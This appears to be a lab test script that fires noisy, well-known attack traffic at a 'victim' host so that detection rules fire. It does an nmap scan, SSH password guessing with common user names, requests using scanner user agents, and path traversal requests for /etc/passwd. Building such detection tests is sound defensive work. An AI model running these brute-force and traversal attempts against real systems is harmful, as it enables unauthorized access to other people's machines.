#!/usr/bin/env bash
# Generates noisy, well-known attack traffic against the victim so every
# detection rule has something to find. Runs inside the lab network only.
set -u
TARGET="${TARGET:-victim}"

echo "[1] Port and service scan"
nmap -sV -p 22,80 "$TARGET" >/dev/null 2>&1 || true

echo "[2] SSH password guessing with common user names"
for user in admin test oracle ubuntu pi deploy; do
  sshpass -p 'password123' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    -o ConnectTimeout=5 -o NumberOfPasswordPrompts=1 "$user@$TARGET" true >/dev/null 2>&1 || true
done

echo "[3] Web requests with scanner user agents"
for ua in "Mozilla/5.00 (Nikto/2.5.0)" "sqlmap/1.8#stable (https://sqlmap.org)" "gobuster/3.6"; do
  curl -s -o /dev/null -A "$ua" "http://$TARGET/admin" || true
done

echo "[4] Path traversal attempts"
curl -s -o /dev/null --path-as-is "http://$TARGET/../../../../etc/passwd" || true
curl -s -o /dev/null "http://$TARGET/download?file=..%2f..%2f..%2fetc%2fpasswd" || true

echo "Done. Detector picks these up within ~30 s."
